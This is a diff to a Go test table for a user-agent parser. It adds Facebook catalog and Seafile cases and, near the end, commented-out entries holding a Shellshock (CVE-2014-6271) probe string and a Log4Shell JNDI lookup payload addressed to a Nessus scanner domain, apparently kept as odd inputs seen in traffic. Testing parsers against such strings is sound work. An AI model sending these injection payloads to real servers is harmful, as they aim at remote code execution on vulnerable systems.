@@ -76,6 +76,7 @@ var testTable = [][]string{
 	{"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)", "Applebot", "0.1", "bot", ""},
 	{"Twitterbot/1.0", ua.Twitterbot, "1.0", ua.Applebot, ""},
 	{"facebookexternalhit/1.1", ua.FacebookExternalHit, "1.1", "bot", ""},
+	{"facebookcatalog/1.0", "facebookcatalog", "1.0", "bot", ""},
 	{"Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html", "SemrushBot", "7~bl", "bot", ""},
 	{"Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.268", "YandexBot", "3.0", "bot", ""},
 	{"Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)", "Discordbot", "2.0", "bot", ""},
@@ -117,6 +118,7 @@ var testTable = [][]string{
 	{"Go-http-client/1.1", "Go-http-client", "1.1", "", ""},
 	{"Wget/1.12 (linux-gnu)", "Wget", "1.12", "", ""},
 	{"Wget/1.17.1 (darwin15.2.0)", "Wget", "1.17.1", "", ""},
+	{"Seafile/9.0.2 (Linux)", "Seafile", "9.0.2", "", "Linux"},
 
 	// unstandard stuff
 	{"BUbiNG (+http://law.di.unimi.it/BUbiNG.html)", "BUbiNG", "", "", ""},
@@ -141,6 +143,12 @@ var testTable = [][]string{
 	{"Mozilla/5.0 (Linux; Android 9; m5621 Build/PPR2.180905.006.A1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.158 Safari/537.36", ua.Chrome, "66.0.3359.158", "mobile", ua.Android, "m5621"},
 	{"Mozilla/5.0 (Linux; Android 10; meanIT_X20 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.153 Safari/537.36", ua.Chrome, "110.0.5481.153", "mobile", ua.Android, "meanIT_X20"},
 	{"Mozilla/5.0 (Linux; Android 10;)", "Mozilla/5.0 (Linux; Android 10;)", "", "mobile", ua.Android},
+	// {`() { ignored; }; echo Content-Type: text/plain ; echo ; echo "bash_cve_2014_6271_rce Output : $((70+91))"`, "", "mobile", ua.Android},
+	//{`${jndi:ldap://log4shell-generic-8ZnJfq2XFL3GWyaLyOpT${lower:ten}.w.nessus.org/nessus}`, "", "mobile", ua.Android},
+	//
+
+	//
+	// ${jndi:ldap://log4shell-generic-8ZnJfq2XFL3GWyaLyOpT${lower:ten}.w.nessus.org/nessus}
 
 	// TODO:
 	// Mozilla/5.0 (Linux; U; Android 13; sr-rs; V2206 Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/3.9.3
